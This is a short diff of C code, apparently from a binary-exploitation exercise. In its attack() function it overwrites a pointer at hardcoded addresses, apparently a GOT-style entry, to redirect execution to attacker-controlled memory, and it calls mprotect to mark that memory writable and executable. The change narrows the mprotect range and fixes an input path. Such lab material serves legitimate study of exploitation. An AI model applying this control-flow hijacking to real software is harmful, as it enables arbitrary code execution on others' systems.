@@ -16,13 +16,13 @@ void attack(){
 	unsigned long **LOCATION = (unsigned long **)0x0000000000601080;
 	*LOCATION = (unsigned long *)0x00000000000601018;
 	**LOCATION = (unsigned long) (p2+32);
-	mprotect((void *)((uint64_t)p2 & ~4095),4096*5,PROT_WRITE|PROT_READ|PROT_EXEC);
+	mprotect((void *)((uint64_t)p2 & ~4095),4096,PROT_WRITE|PROT_READ|PROT_EXEC);
 
 }
 
 int main(){
 
-	char file_name[] = "../input/input.txt";
+	char file_name[] = "./input/input.txt";
 	char buf[SIZE];
 	FILE *fp;
     int v,length=0;
